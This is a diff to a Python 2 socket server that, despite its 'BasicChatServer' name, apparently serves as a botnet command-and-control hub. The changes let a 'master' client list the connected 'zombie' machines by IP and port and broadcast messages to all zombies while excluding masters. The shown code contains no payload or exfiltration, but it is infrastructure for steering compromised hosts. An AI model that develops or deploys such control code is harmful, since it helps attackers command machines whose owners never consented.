@@ -17,6 +17,8 @@ class SocketServer(socket.socket):
             self.accept_clients()
         except Exception as ex:
             print ex
+        except KeyboardInterrupt:
+            print ""
         finally:
             print "Server closed"
             for client,role in self.clients:
@@ -43,7 +45,8 @@ class SocketServer(socket.socket):
             data = client.recv(1024)
             data2 = data.rstrip()
             if data2 == "list":
-                self.listzombies()
+                list = self.listzombies()
+                client.send(list)
             if data2 == "die":
                 break
             #Message Received
@@ -54,7 +57,7 @@ class SocketServer(socket.socket):
                 rmrole = i[1]
                 self.clients.remove(i)
         #Client Disconnected
-        self.onclose(client,client.getsockname(),rmrole)
+        self.onclose(client,client.getpeername(),rmrole)
         #Closing connection with client
         client.close()
         #Closing thread
@@ -62,9 +65,10 @@ class SocketServer(socket.socket):
         print self.clients
 
     def broadcast(self, message):
-        #Sending message to all clients
+        #Sending message to all zombie clients
         for client,role in self.clients:
-            client.send(message+"\n")
+            if role != "master":
+                client.send(message+"\n")
 
     def multicast(self,message,sender):
         #Sending message to all clients but sender
@@ -104,11 +108,14 @@ class BasicChatServer(SocketServer):
 
     def listzombies(self):
         #List all clients currently connected
+        list = "\n===== List of zombies connected =====\n\n"
         i = 0
         for client,role in self.clients:
             if role == "zombie":
-                print "Zombie #" + str(i) + " - at " + client.getsockname()[0]
+                # print "Zombie #" + str(i) + " - at " + client.getpeername()[0] + " port " + client.getpeername()[1]
+                list += "Zombie #" + str(i) + " - at " + client.getpeername()[0] + " port " + str(client.getpeername()[1]) + "\n"
             i += 1
+        return list
 
 def main():
     server = BasicChatServer()
